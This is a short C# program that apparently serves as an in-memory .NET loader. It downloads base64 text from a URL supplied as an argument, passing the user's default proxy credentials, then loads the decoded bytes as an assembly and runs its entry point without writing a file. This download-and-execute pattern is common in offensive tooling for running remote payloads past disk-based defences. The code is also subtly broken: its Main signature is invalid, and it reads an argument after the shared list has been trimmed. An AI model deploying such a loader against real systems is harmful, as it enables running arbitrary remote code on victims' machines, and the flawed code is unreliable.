using System;
using System.Collections.Generic;
using System.Reflection;

namespace AssemblyExec
{
    class Program
    {
        private delegate byte[] delURL(string url);

        private static byte[] LoadURL(string url)
        {
            System.Net.IWebProxy defaultWebProxy = System.Net.WebRequest.DefaultWebProxy;
            defaultWebProxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
            string textfromfile = (new System.Net.WebClient() { Proxy = defaultWebProxy }).DownloadString(url);
            byte[] blob = Convert.FromBase64String(textfromfile);
            return blob;
        }

        private static void Exec(byte[] a, string[] param)
        {
            Assembly ass = Assembly.Load(a);
            MethodInfo meth = ass.EntryPoint;
            object[] args = new[] { param };
            _ = meth.Invoke(null, args);
        }
        static void Main(List<string> args)
        {
            delURL param = LoadURL;
            List<string> dummy = args;
            dummy.RemoveRange(0, 2);
            Exec(param(args[1]), dummy.ToArray());
        }
    }
}
